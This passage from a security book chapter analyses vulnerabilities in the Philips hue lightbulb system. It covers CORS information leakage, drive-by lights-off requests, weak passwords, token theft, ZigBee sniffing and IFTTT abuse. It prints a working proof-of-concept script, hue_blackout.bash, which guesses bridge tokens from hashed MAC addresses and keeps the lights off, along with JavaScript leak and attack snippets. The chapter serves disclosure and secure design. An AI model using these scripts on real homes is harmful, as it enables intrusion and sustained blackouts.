":"iPad 4G","create date":"2012-11-23T05:54:57","last use date":"2013-02-11
T21:29:12"},"[DELETED]":{"name":"iPhone 5","create date":"2012-11-22T04:49:
57","last use date":"2012-12-03T01:21:56"},"[DELETED]":{"name":"iPhone 5","
create date":"2012-12-09T04:04:39","last use date":"2013-04-29T21:10:32"}}}
,"groups":{}},"lastHeardAgo":5 };app.data.bridgeid = "[DELETED]";[DELETED]
As you can see, the HTTP response includes information about the lightbulbs associated
with the bridge and their state, as well as the internal bridge IP address and id.
Notice the whitelist elements in the response. The strings associ‐
ated with this element represent authorized tokens that can be used
to send the bridge commands directly. We will cover the use of white‐
listed elements in the following sections.
10 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

The HTTP response also includes status about the states of various bulbs (for example,
"Bathroom 1“) that is displayed to the user in the web interface.
The user is presented with a dashboard containing various scenes (configured to turn
bulbs into a combination of colors and brightness for convenience) and the set of bulbs.
As shown in Figure 1-5, the user can select a scene, configure an individual bulb, or turn
all bulbs on or off.
Figure 1-5. User dashboard for turning lights on or off
In the case where the user wants to turn all the bulbs off and clicks the “off” button, the
browser directly connects to the bridge (IP address 192.168.2.2 in this case) if the user
is on the same local network as the bridge:
PUT /api/[+whitelist DELETED+]/groups/0/action HTTP/1.1
Host: 192.168.2.2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)
AppleWebKit/536.28.10
(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: keep-alive
Contolling Lights Via the Website Interface 
| 
11

Proxy-Connection: keep-alive
Content-Length: 12
{"on":false}
As you can see, the browser sends its whitelist token that was generated when the
bridge was associated with the user’s account. The /groups/0/action command is
documented in Section 2.5 of the Philip’s API (free registration required) and is used to
turn all lights off.
In the case where the user is remote and not on the same local segment as the bridge,
the message is routed through the web server:
GET /en-US/user/sendMessageToBridge?clipmessage=%7B%22bridgeId%22%3A%22[DELETED]
%22%2C%22clipCommand%22%3A%7B%22url%22%3A%22%2Fapi%2F0%2Fgroups%2F0%2Faction%22%
2C%22method%22%3A%22PUT%22%2C%22body%22%3A%7B%22on%22%3Afalse%7D%7D%7D HTTP/1.1
Host: www.meethue.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)
AppleWebKit/536.28.10
(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: https://www.meethue.com/en-US/user/scenes
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Cookie:[DELETED]
Connection: keep-alive
Proxy-Connection: keep-alive
Notice that in this case the value of the clipCommand contains the same /groups/0/
action command as the local request. The bridge quickly collects this instruction from
the established outbound connection by issuing a POST request to /queue/getmessage?
id=[DELETED id]&sso=[DELETED]. Once the bridge processes the request, the server
responds to the browser with a positive affirmation that all lights are turned off:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_SESSION=[DELETED];Path=/
Vary: Accept-Encoding
Date: Sun, 05 May 2013 23:04:19 GMT
Server: Google Frontend
Content-Length: 41
{"code":200,"message":"ok","result":"ok"}
12 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

The ok codes for message and result signify that the instructions executed successfully
and the bulbs were turned off.
Information Leakage
The web server associated with the hue website and the bridge (the bridge has a web
server listening on TCP port 80) includes the following header when they respond to
requests:
Access-Control-Allow-Origin: *
According to cross-origin policies within web browsers, this header allows JavaScript
code on any website on the Internet to access the results from the web servers running
on the hue website and the bridge. This leads to a situation in which an external entity
can capture the fact that the user is on a network segment that has the hue system
installed, as well as capture the bridge’s id, MAC address, and internal IP address.
To illustrate this, consider the following HTML code:
<HTML>
        <SCRIPT>
                // Create the XHR object.
                function find_hue()
                {
                        var url = 'https://www.meethue.com/api/nupnp';
                        var xhr = new XMLHttpRequest();
                        xhr.open('GET', url, true);
                        xhr.onload = function()
                        {
                                var text = xhr.responseText;
                                var obj=JSON.parse(text.substr(1,
                                text.length-2));
                                document.write('<H3>Your Hue bridge id
                                is '+ obj.id + '</H3><BR>');
                                document.write('<H3>Your Hue bridge
                                internal IP address is '+
                                obj.internalipaddress + '</H3><BR>');
                                document.write('<H3>Your Hue bridge MAC
                                address is '+ obj.macaddress + '</H3><BR>');
                        };
                        xhr.send();
                }
                find_hue();
Contolling Lights Via the Website Interface 
| 
13

        </SCRIPT>
</HTML>
Assume the HTML code is hosted on an external website. As shown in Figure 1-6, the
website hosted at www.dhanjani.com is able to capture the bridge’s id, internal IP ad‐
dress, and MAC address. As shown in the HTML code, this is done by using XMLHttpRe
quest, which makes the web browser connect to a domain other than www.dhanja
ni.com (i.e., meethue.com). The owner of the external website can easily capture this
information and store it.
Figure 1-6. Information leakage to external website
From a security perspective, just the mere fact of visiting an arbitrary website should
not reveal this information to the website owner. We classify this issue as information
leakage, because it reveals information to an external entity who has not been authorized
by the user to obtain this data.
Drive-by Blackouts
The web server running on the bridge also has the Access-Control-Allow-Origin
header set to *. Should the owner of an external website know one of the whitelist
tokens associated with the bridge, he or she can remotely control the lights by perform‐
ing an XMLHttpRequest to get the bridge’s internal IP address (as discussed earlier) and
then performing another XMLHttpRequest to the bridge’s IP address using PUT:
xhr.open('PUT', 'http://'+obj.internalipaddress+'/api/[whitelist DELETED]/groups/
0/action', true);
and then sending the body of the PUT request:
xhr.send("{\"on\":false}");
14 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

This would cause the victim’s browser to command the hue bridge to turn the lights off,
just by visiting the malicious website (thus the term drive-by).
The probability of a malicious person pulling this off is low, because they would have
to know one of the whitelist tokens. But it is a poor design decision to set the Access-
Control-Allow-Origin header to *, because good security mechanisms should not
allow an arbitrary website to be able to force lights to turn off, even if they knew one of
the whitelist tokens.
Weak Password Complexity and Password Leaks
The hue website lets the user control the lights remotely as long as the user logs in with
valid credentials.
As shown in Figure 1-7, the hue website requires only that passwords be at least char‐
acters long. Users might be tempted to create easily guessable passwords such as
123456. In fact studies have shown 123456 and password to be the most common pass‐
words.
Figure 1-7. A password requirement of at least six characters
Contolling Lights Via the Website Interface 
| 
15

While it is true that, ultimately, the user is at fault for selecting weak passwords such as
these, it is also the job of security architects to make it harder for people to make such
mistakes. Most people just want their devices and software to work in the moment and
simply aren’t aware of potential negative repercussions in the future.
Despite the weak password policy, the website does lock out the account for one minute
after every two failed login attempts (Figure 1-8). This decreases the odds of brute-force
password attacks in the event that a user has have selected a password that is not easily
guessable.
16 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-8. Account locked for one minute after two failed login attempts
However, another major problem is users’ tendency to reuse their credentials on other
services. News of major password leaks occur on a frequent, if not daily, basis. When
Contolling Lights Via the Website Interface 
| 
17

an attack has compromised a major website, an attacker can easily attempt to log into
the hue website using usernames and passwords obtained from such leaks.
This scenario is high risk, because all the attacker needs to do is go through usernames
(when they are in the form of email addresses) and passwords that have been compro‐
mised and posted publicly and begin to test the credentials on the hue website. In this
way, attackers can easily harvest hue accounts and gain the ability to change the state of
people’s lightbulbs remotely.
On a related note, another threat is the potential compromise of the hue website infra‐
structure or the abuse of the system by a disgruntled employee. Either of these situations
can put enormous power in the hands of a potential attacker. Philips has not publicly
stated their internal governance process or the steps they may have taken to detect
possible attacks on their infrastructure. There is no indication from Philips on how they
protect the stored passwords in their databases or whether they are accessible to their
employees in the clear.
Controlling Lights Using the iOS App
Users can also control hue lights locally or remotely using an iPhone or iPad with the
hue app on the iOS App Store.
When the hue app is first launched, it tests to see if it has authorization to send com‐
mands to the hue bridge on the local network:
GET /api/[username DELETED] HTTP/1.1
Host: 10.0.1.2
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-us
Connection: keep-alive
Pragma: no-cache
User-Agent: hue/1.1.1 CFNetwork/609.1.4 Darwin/13.0.0
The username token is selected by the hue app. This is the response from the bridge:
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Content-type: application/json
[{"error":{"type":1,"address":"/","description":"unauthorized user"}}]
18 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Since this is the first time the iOS device is attempting to connect to the bridge, the iOS
device is not authorized. In this situation, the user needs to prove physical ownership
by pressing the button on the bridge. At this point, the iOS app instructs the user to
press the physical button on the bridge, as shown in Figure 1-9.
Controlling Lights Using the iOS App 
| 
19

Figure 1-9. iOS app instructing the user to press the physical button on the bridge
20 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Behind the scenes, the iOS app sends the following POST request to the bridge:
POST /api HTTP/1.1
Host: 10.0.1.2
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-us
Accept: */*
Pragma: no-cache
Connection: keep-alive
User-Agent: hue/1.1.1 CFNetwork/609.1.4 Darwin/13.0.0
Content-Length: 71
{"username":"[username DELETED]","devicetype":"iPhone 5"}
Note that the value of the username field sent here is the same as the one sent in the
previous request, which failed because the iOS app was running for the first time on the
particular device. If the user presses the button on the bridge within 30 seconds, this
particular username will become authorized and can be used to issue commands to the
bridge while on the local network.
Assuming that the user does press the button on the bridge, the bridge sends the fol‐
lowing response to the iOS app:
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Content-type: application/json
[{"success":{"username":"[username DELETED]"}}]
The bridge responds positively and echoes back the username field provided by the iOS
app. Now that the iOS App is now successfully authorized, it can command the bridge
with instructions, as long as it remembers the value of the username field.
The user can turn all lights off using the iOS app, as shown in Figure 1-10.
Controlling Lights Using the iOS App 
| 
21

Figure 1-10. User tapping “ALL OFF” button in iOS app
22 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

When the user selects to turn all lights off from the iOS App (and assuming the user is
in the local network, i.e., at home), the iOS app will send the following request directly
to the bridge:
PUT /api/[username DELETED]/groups/0/action HTTP/1.1
Host: 10.0.1.2
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-us
Pragma: no-cache
Connection: keep-alive
User-Agent: hue/1.1.1 CFNetwork/609.1.4 Darwin/13.0.0
Content-Length: 12
{"on":false}
And the bridge responds:
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
Content-type: application/json
[{"success":{"/groups/0/action/on":false}}]
The success attribute with the false value indicates that the command executed suc‐
cessfully and the lights were turned off (i.e., /groups/0/action/on indicates that the on
state is negative, which means it is false that the lights are turned on).
In the case where the iPhone is not on the same network segment (i.e., the user is
remote), the iOS app can remotely issue commands to the bridge via the portal infra‐
structure. In this case, the iOS device notifies the user that it is unable to connect to the
bridge directly, as shown in Figure 1-11.
Controlling Lights Using the iOS App 
| 
23

Figure 1-11. Hue iOS app notifying the user that it is unable to connect to the bridge
24 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

When the user taps More on the dialog in Figure 1-11, the app then presents an option
to “Setup away from home,” as shown in Figure 1-12.
Controlling Lights Using the iOS App 
| 
25

Figure 1-12. Options available when user taps More
26 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

When the user selects the “Setup away from home” option, the app launches the Safari
browser in iOS and requests the user’s credentials (shown in Figure 1-13). The user
needs to enter the website credentials established previously in “Contolling Lights Via
the Website Interface” on page 4.
Controlling Lights Using the iOS App 
| 
27

Figure 1-13. Portal login page to authorize iOS app
28 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Once the user enters the credentials and logs in, he or she is asked to authorize the app
(Figure 1-14).
Controlling Lights Using the iOS App 
| 
29

Figure 1-14. User is asked to authorize iOS app
30 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Once the user selects Yes, the browser sends the following GET request to www.meet
hue.com:
GET /en-US/api/getaccesstokenpost HTTP/1.1
Host: www.meethue.com
Referer: https://www.meethue.com/en-US/api/getaccesstokengivepermission
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: [DELETED]
Accept-Language: en-us
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_4 like Mac OS X)
AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B350 Safari/8536.25
The server then responds with the following:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: [DELETED]
Vary: Accept-Encoding
Date: Mon, 08 Jul 2013 05:24:14 GMT
Server: Google Frontend
Content-Length: 1653
<!DOCTYPE html>
<html>
  <head>
    <meta content="0;phhueapp://sdk/login/8/[TOKEN DELETED]=" http-equiv=
    "refresh" />
[Rest of HTML deleted for brevity]
The response from the server redirects the web browser to the phhueapp://sdk/login/
8/[TOKEN DELETED] URL, which causes the hue iOS app to relaunch. The iOS app is
passed the TOKEN value, which it stores and remembers to be able to connect to
www.meethue.com in the future and issue commands to the bridge remotely.
phhueapp: is known as a URL Scheme, which enables the Safari
browser and other Apps to launch particular Apps that have regis‐
tered the particular handler. For example, the native Maps app can be
launched by typing in maps:// in the Safari browser in iOS. In this
case, the hue app registered the phhueapp: handler, so Safari can
launch the hue app when it is redirected to a URL beginning with the
phhueapp: string.
Controlling Lights Using the iOS App 
| 
31

Now, when the use is remote (i.e., not on the same wireless network as the bridge),
commands are routed via the Internet to www.meethue.com. In this situation, when the
user taps on “ALL OFF” (Figure 1-10), the iOS app sends the following request with the
authorized TOKEN value it obtained earlier:
POST /api/sendmessage?token=[DELETED} HTTP/1.1
Host: www.meethue.com
Proxy-Connection: keep-alive
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-us
Accept: */*
Connection: keep-alive
User-Agent: hue/1.0.2 CFNetwork/609.1.4 Darwin/13.0.0
Content-Length: 127
clipmessage={ bridgeId: "[DELETED}", clipCommand: { url:
"/api/0/groups/0/action", method: "PUT", body:
{"on":false} } }
In this case, the bridge responds:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_SESSION=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Date: Mon, 06 May 2013 19:51:58 GMT
Server: Google Frontend
Content-Length: 41
{"code":200,"message":"ok","result":"ok"}
The ok response from www.meethue.com signifies that the command was executed suc‐
cessfully and that all the lights were turned off.
Stealing the Token from a Mobile Device
The iOS app stores the username token and the TOKEN for www.meethue.com in the
Library/Preferences/com.philips.lighting.hue.plist file on the iPhone and iPad (stored as
uniqueGlobalDeviceIdentifier and sdkPortalToken respectively). Someone with
temporary access to a hue user’s mobile device can capture this file and then be able to
remotely control the hue bulbs. The probability of this risk is low, because the malicious
entity would require physical access to the mobile device.
32 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Malware Can Cause Perpetual Blackout
In the analysis of the use case, we studied how the username token is registered with the
bridge by the iOS app. This secret token can be used by any device on the local network
to connect directly to the bridge and issue it authorized commands to control the bulbs.
I found that the username token selected by the iOS app was not random but the
message-digest algorithm (MD5)-based hash of the iPhone’s MAC address. Every net‐
work card (wired or wireless) has a unique MAC address issued by the manufacturer.
In the case of wired or wireless networks, the MAC addresses of devices on the local
network that have transmitted data recently can be viewed by issuing the arp command
on most operating systems:
$ arp -a -n
? (172.20.0.1) at d4:ae:52:9d:1f:49 on en0 ifscope [ethernet]
? (172.20.0.23) at 7c:7a:91:33:be:a4 on en0 ifscope [ethernet]
? (172.20.0.52) at d8:a2:5e:4b:9a:50 on en0 ifscope [ethernet]
? (172.20.0.75) at 54:e4:3a:a6:4b:0e on en0 ifscope [ethernet]
? (172.20.0.90) at c8:f6:50:08:5f:e7 on en0 ifscope [ethernet]
? (172.20.0.154) at 74:e1:b6:9f:12:66 on en0 ifscope [ethernet]
Based on the output of the arp command, we can see the MAC addresses associated
with the particular device. For example, the device with the IP address of 172.20.0.90
has the MAC address c8:f6:50:08:5f:e7.
The MD5 algorithm in use is known as a one-way hash. So, the MD5 hash of
c8:f6:50:08:5f:e7 can be computed with the md5 tool:
$ md5 -s "c8:f6:50:08:5f:e7"
MD5 ("c8:f6:50:08:5f:e7") = 4ad1c59ad3f1c4fcdd67a55ee8f80160
In this case, the MD5 hash of c8:f6:50:08:5f:e7 is and always will be
4ad1c59ad3f1c4fcdd67a55ee8f80160. Given the one-way nature of MD5, it is hard to
compute the MAC address back from the actual hash. However, imagine a situation in
which a device on the same network has been infected with a malicious program in‐
stalled by an intruder (also known as malware). This malware can easily issue the arp
command and quickly compute the MD5 hash of each MAC address in the table. Then,
in order to cause a blackout, the malware simply has to connect to the hue bridge on
the local network and use the hash as the username to turn off the lights. This creates a
situation in which arbitrary malware on any device on the local network can directly
connect to the bridge and continuously issue commands to turn the lights off causing
a perpetual blackout.
Let’s imagine a proof-of-concept malware program written using the simple bash shell
available on most Unix and Linux hosts. First, the malicious script needs to locate the
IP address of the bridge:
Controlling Lights Using the iOS App 
| 
33

while [ -z "$bridge_ip" ];
do
    bridge_ip=($(curl --connect-timeout 5 -s https://www.meethue.com/api/nupnp
    |awk '{match($0,/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/);
    ip = substr($0,RSTART,RLENGTH); print ip}'))
    # If no bridge is found, try again in 10 minutes
    if [ -z "$bridge_ip" ];
    then
        sleep 600
    fi
done
The script browses to https://www.meethue.com/api/nupnp (see Figure 1-4) to obtain
the IP address of the bridge. If no bridge is found using this URL, it just sleeps for 10
minutes and keeps trying until a bridge is located on the local network.
Next, the script enters into an infinite loop:
while true; do
Within this infinite loop, it first gets the MAC addresses using the arp command:
mac_addresses=( $(arp -a | awk '{print toupper($4)}')
Now, for each MAC address, it pads the format so that MAC addresses such as
1:2:3:4:5:6 are in the format of 01:02:03:04:05:06:
padded_m=`echo $m |
            sed "s/^\(.\):/0\1:/" |
            sed "s/:\(.\):/:0\1:/g" |
            sed "s/:\(.\):/:0\1:/g" |
            sed "s/:\(.\)$/:0\1/"`
The script then computes the MD5 hash of the MAC address in the loop:
bridge_username=( $(md5 -q -s $padded_m))
Now, the script uses curl to connect to the bridge and issue it a lights-off command
using the calculated username:
turn_it_off=($(curl --connect-timeout 5 -s -X PUT http://$bridge_ip/api/
$bridge_username/groups/0/action -d {\"on\":false} | grep success))
If the command succeeds, the script goes into another infinite loop and perpetually
issues the lights-off command to the bridge:
if [ -n "$turn_it_off" ]; then
                        echo "SUCCESS! It's blackout time!";
                while true;
                do
                    turn_it_off=($(curl --connect-timeout 5
                    -s -X PUT http://$bridge_ip/api/$bridge_username
34 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

                    /groups/0/action -d {\"on\":false} | grep success))
                done
Example 1-1 contains the complete source code for the script.
Example 1-1. hue_blackout.bash
#!/bin/bash
# This script demonstrates how malware can cause sustained blackout on the
# Philips hue lightbulb system
# By design, the hue client software uses the MD5 hash of the users’ MAC
# address to register with the hue bridge
# This script collects the ARP addresses on the victim’s laptop or desktop
# to locate devices on the network that are likely to have been registered
# with the bridge. It then calculates the MD5 hash of each of the addresses
# and uses the output to connect to the hue bridge and issue a command to
# turn all the lights off. Once it finds a working token, it infinitely loops
# through the same request causing a continuous blackout (i.e. the lights
# turn off again if the user physically switches the bulbs off and then on
# again). If the user deregisters the associate device, the script goes back
# to looking for more valid MAC addresses. If the user registers the same
# device, the script will again cause a sustained blackout and repeat the
# process
# Written by Nitesh Dhanjani
# Get the internal IP of the bridge which is advertised on the meethue portal.
while [ -z "$bridge_ip" ];
do
    bridge_ip=($(curl --connect-timeout 5 -s https://www.meethue.com/api/nupnp
    |awk '{match($0,/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/); ip =
    substr($0,RSTART,RLENGTH); print ip}'))
    # If no bridge is found, try again in 10 minutes.
        if [ -z "$bridge_ip" ];
    then
                sleep 600
        fi
done
# Bridge found, lets cycle through the MAC addresses and cause a blackout.
echo "Found bridge at $bridge_ip"
# We never break out of this loop ;-)
while true;
do
    # Get MAC addresses from the ARP table
    mac_addresses=( $(arp -a | awk '{print toupper($4)}') )
    # Cycle through the list
Controlling Lights Using the iOS App 
| 
35

    for m in "${mac_addresses[@]}"
    do
        # Pad it so 0:4:5a:fd:83:f9 becomes 00:04:5a:fd:83:f9 (thanks
        # http://code.google.com/p/plazes/wiki/FindingMACAddress)
        padded_m=`echo $m |
                    sed "s/^\(.\):/0\1:/" |
                    sed "s/:\(.\):/:0\1:/g" |
                    sed "s/:\(.\):/:0\1:/g" |
                    sed "s/:\(.\)$/:0\1/"`
        # Ignore broadcase entries in the ARP table
        if [ $padded_m != "FF:FF:FF:FF:FF:FF" ]
        then
            # Compute MD5 hash of the MAC address
            bridge_username=( $(md5 -q -s $padded_m))
            # Use the hash to attempt to instruct the bridge to turn
            # all lights off
            turn_it_off=($(curl --connect-timeout
            5 -s -X PUT
            http://$bridge_ip/api/$bridge_username/groups/0/action -d
            {\"on\":false} | grep success))
            # If it worked, go into an infinite loop and cause a sustained
            # blackout
            if [ -n "$turn_it_off" ];
            then
                echo "SUCCESS! It's blackout time!";
                while true;
                do
                    turn_it_off=($(curl --connect-timeout 5 -s
                    -X PUT http://$bridge_ip/
                    api/$bridge_username/groups/0/action -d {\"on\":false}
                    | grep success))
                    # The hue bridge can't keep up with too many iterative
                    # requests. Sleep for 1/2 a sec to let it recover
                    sleep 0.5
                    # Break out of the loop and go back to cycling through
                    # ARP entries if the user de-registered the device
                    # NOTE: If the user were to register the same physical
                    # device, we will get the token again and redo the blackout.
                    # Or, we may get a hold of another registered device from
                    # the ARP table.
                    if [ -z "$turn_it_off" ];
                    then
36 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

                        echo "Hm. The token doesn't work anymore the user must
                        have deregistered the device :("
                        break
                    fi
                done
            fi
        fi
    done
    unset mac_addresses;
done
One other issue with the design of the system is that there is no way to unregister a
whitelist token. In other words, if a device such as an iPhone is authorized to the
bridge, there is no user-facing functionality to unauthorize the device. Since the au‐
thorization is performed using the MAC address, an authorized device will continued
to enjoy access to the bridge.
See Hacking Lightbulbs for a video demonstration of the hue_back‐
out.bash script.
Note that, upon notification to Philips, this issue was fixed and a software and firmware
update has been released.
Changing Lightbulb State
So far, we’ve seen how to command the hue bridge to change the state of bulbs. The
bridge itself uses the ZigBee Light Link (ZLL) wireless protocol to instruct the bulbs.
Built upon the IEEE 802.15.4 standard, ZLL is a low-cost, low-powered, popular pro‐
tocol used by millions of devices and sensors, including the Philips hue system. The
ZLL standard is a specification of a ZigBee application profile that defines communi‐
cation parameters for lighting systems related to the consumer market and small pro‐
fessional installations.
ZLL requires the use of a manufacturer-issued master key, which is stored on both the
bridge and the lightbulbs. Upon initiation (when the user presses the button on the
bridge), the bridge generates a random network key and encrypts it using the master
key. The lightbulbs use the master key to decrypt and read the network key and use it
to subsequently communicate with the bridge.
Changing Lightbulb State 
| 
37

Using the Killerbee framework and an RZ USBstick, we can sniff ZLL network traffic.
After plugging in the RZ USBstick, first identify it using zbid, a tool that is part of the
Killerbee suite:
# zbid
Dev     Product String  Serial Number
002:005 KILLERB001        [DELETED]
Next, we can begin sniffing using zbwireshark (on channel 11):
# zbwireshark -f 11 -i '002:005'
This starts up the Wireshark tool to capture Zigbee traffic.
As shown in Figure 1-15, the hue bridge continuously sends out beacon broadcast re‐
quests on channel 11 (ZigBee channels range from 11 to 26). A candidate device (light‐
bulb) can respond to the beacon request to join the network.
Figure 1-15. Wireshark capture of beacon requests
In this case, other than beacon requests, ZLL traffic was found operating on channel
20, as shown in Figure 1-16. The Security Control Field in the ZigBee Security Header
is set to 0x01, which indicates that a message authentication code (MAC) is in use (AES-
CBC-MAC-3/MIC-32). The transmission of the MAC is also captured and illustrated.
38 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-16. Wireshark capture of channel 20 traffic
Once the bridge receives an authorized request to change the state of an associate light‐
bulb, the ZigBee protocol and the ZLL specification is used to communicate to the bulbs,
as captured and shown in Figure 1-15 and Figure 1-16.
We know the bridge uses the ZLL protocol to communicate with the bulbs. The bridge
also uses a shared secret key to maintain an HTTP-based outbound connection with
the hue infrastructure. This connection is used by the bridge to pick up commands that
are routed through the hue website (or the iOS app, if the user is remote). It is possible
for a flaw to exist in the implementation of ZLL or the encryption used by the bridge.
However, to exploit the issue, the attacker would need to be physically close to the victim
(to abuse an issue with ZLL) or be able to intercept and inject packets on the network
segment.
Since the probability of this issue is low, it is not deemed to be a critical risk, although
the potential is worth stating.
Changing Lightbulb State 
| 
39

If This Then That (IFTTT)
If This Then That (IFTTT) is a service that lets users create recipes that follow the simple
logic of “if this then that” instructions. Users can create recipes across multiple cloud
services such as Gmail, Dropbox, LinkedIn, Twitter, etc. For example, you can use the
app to establish actions based on conditions such as, “Every time I’m tagged on a photo
in Facebook, also upload it to my Dropbox account.”
IFTT users can also create recipes for the hue lightbulb system (Figure 1-17)--for ex‐
ample, “If I’m tagged in a photo in Facebook, blink my lights to let me know.”
Figure 1-17. Hue channel on IFTTT (If This Then That)
The IFTTT service allows the user community to contribute recipes for the various
channels, including hue. With so many readily available recipes, users might not always
think through the implications of how the recipe might be abused by others to influence
their IoT devices.
40 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

As an example of an insecure recipe, consider the one shown in Figure 1-18, which
allows the user to change the bulb colors from a photo he or she has been tagged in.
Figure 1-18. IFTTT recipe to change bulb colors from a tagged Facebook photo
As shown in Figure 1-19, when an attacker uploads an image on Facebook that is com‐
pletely black and tags the victim, the recipe causes a blackout in the victim’s home or
office.
If This Then That (IFTTT) 
| 
41

Figure 1-19. Tagging a Facebook photo that is completely black
Another issue to consider is authorized sessions stored in the IFTTT platform. Users
can sign up and associate powerful platforms such as Facebook, Dropbox, Gmail, etc.
A compromise of IFTTT’s infrastructure, the infrastructure of other associated plat‐
forms, the user’s IFTTT accounts, or other platform accounts can be abused by attackers
to influence the state of the bulbs via recipes that are in use.
This potential issue is a good example of the upcoming wave of interoperability between
IoT devices and cloud platforms. It is only a matter of time before we will begin to see
attacks that exploit cross platform vulnerabilities to influence IoT infrastructures.
Conclusion
We have come to depend on lighting for convenience, as well as for our safety and for
the functioning of our societies and economies. For this reason, the IoT devices that
control lighting must include security as part of their architecture and design.
Philips’s hue lighting system is one of the more popular IoT devices in the market today.
This chapter has presented various security issues for this system, including funda‐
mental issues such as password security and the possibility of malware abusing weak
authorization mechanisms to cause sustained blackouts. We also discussed the com‐
plexity of internetworking our online space (such as Facebook) with IoT devices using
42 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

services such as IFTTT. While these services are useful and will enable our automated
future, we need to continue to think through the implications of security and privacy
issues.
Lighting device manufacturers should make efforts to verify that their design is secure
and free from the security issues discussed in this chapter. Consumers should be aware
of vulnerabilities that could exist in the devices they are using in their homes and offices
and demand that the lighting device manufacturers provide evidence that the products
are securely designed.
Conclusion 
| 
43


CHAPTER 2
Electronic Lock Picking: Abusing Door Locks
to Compromise Physical Security
One of the oldest evidence of locks dates back to 4,000 years ago within the ruins of the
ancient Egyptian empire. This lock came to be known as the Egyptian lock because of
its popularity in the area. The lock was made of wood and contained wooden pegs of
different lengths. A slot in the door provided access to a wooden key with pegs of com‐
plementary lengths. The key needed to be inserted into the lock and lifted up, to align
the pegs evenly at the top of the bolt, thereby allowing the door to open.
Since the Egyptians, we’ve had influences from the Greeks, the Romans, and various
eastern implementations from China, Turkey, and India. Later influences from Britian
and the United States have brought us to the various types locks we rely upon today,
which include a combination of movable levers, cylindrical keys, and pin tumblers to
make it a little harder for the lock to open without the correct key.
We depend upon locks in our homes for our physical safety, even while many of us are
